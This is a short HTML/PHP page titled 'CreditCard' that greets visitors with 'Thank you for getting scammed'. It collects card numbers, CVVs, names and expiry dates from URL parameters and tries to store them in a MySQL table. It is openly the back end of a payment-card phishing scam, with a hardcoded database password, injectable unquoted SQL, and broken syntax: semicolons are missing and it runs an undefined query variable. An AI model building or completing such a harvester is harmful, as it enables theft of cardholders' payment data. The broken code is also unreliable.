<!DOCTYPE html>
<html>
<head>
<title>CreditCard</title>
</head>

<body>
    <p>Thank you for getting scammed</p>
                <?php
                    $servername = "localhost";
                    $username = "php";
                    $password = "fer123";
                    $dbname = "creditcard";
                    $CC = ($_GET['CardNumber'])
                    $CVV = ($_GET['CCV'])
                    $firstname = ($_GET['firstname'])
                    $lastname = ($_GET['lastname'])
                    $emonth = ($_GET['ExpiryMonth'])
                    $eyear = ($_GET['ExpiryYear'])

                        $CC = htmlspecialchars($_GET['CardNumber']);
                        echo $CC 

                            // Create connection
                            $conn = new mysqli($servername, $username, $password, $dbname);
                            // Check connection
                            if ($conn->connect_error) 
                            {
                                die("Connection failed: " . $conn->connect_error);
                            }
                            $sql_insert= "INSERT INTO ccinfo (firstname, lastname, creditcard, cvv, month, year) VALUES ($firstname,$lastname,$CC,$CVV,$emonth,$eyear);";
                            if ($conn->query($sql) === TRUE) 
                            {
                                echo "New record created successfully";
                            } else {
                                echo "Error: " . $sql . "<br>" . $conn->error;
                            }

                    $conn->close();
                ?>
</body> 

</html>